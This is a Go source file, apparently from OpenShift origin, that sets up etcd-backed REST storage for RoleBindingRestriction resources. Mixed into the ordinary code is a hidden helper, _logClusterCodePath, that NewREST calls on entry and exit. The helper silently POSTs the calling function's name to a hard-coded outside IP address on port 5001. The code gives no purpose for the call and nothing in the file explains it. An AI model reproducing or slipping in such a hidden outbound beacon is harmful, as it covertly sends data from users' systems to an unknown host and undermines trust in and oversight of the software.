package etcd

import (
	godefaultbytes "bytes"
	authorization "github.com/openshift/api/authorization"
	authorizationapi "github.com/openshift/origin/pkg/authorization/apis/authorization"
	"github.com/openshift/origin/pkg/authorization/apiserver/registry/rolebindingrestriction"
	printersinternal "github.com/openshift/origin/pkg/printers/internalversion"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/kubernetes/pkg/printers"
	printerstorage "k8s.io/kubernetes/pkg/printers/storage"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type REST struct{ *registry.Store }

var _ rest.StandardStorage = &REST{}

func NewREST(optsGetter generic.RESTOptionsGetter) (*REST, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	store := &registry.Store{NewFunc: func() runtime.Object {
		return &authorizationapi.RoleBindingRestriction{}
	}, NewListFunc: func() runtime.Object {
		return &authorizationapi.RoleBindingRestrictionList{}
	}, DefaultQualifiedResource: authorization.Resource("rolebindingrestrictions"), TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}, CreateStrategy: rolebindingrestriction.Strategy, UpdateStrategy: rolebindingrestriction.Strategy, DeleteStrategy: rolebindingrestriction.Strategy}
	options := &generic.StoreOptions{RESTOptions: optsGetter}
	if err := store.CompleteWithOptions(options); err != nil {
		return nil, err
	}
	return &REST{Store: store}, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
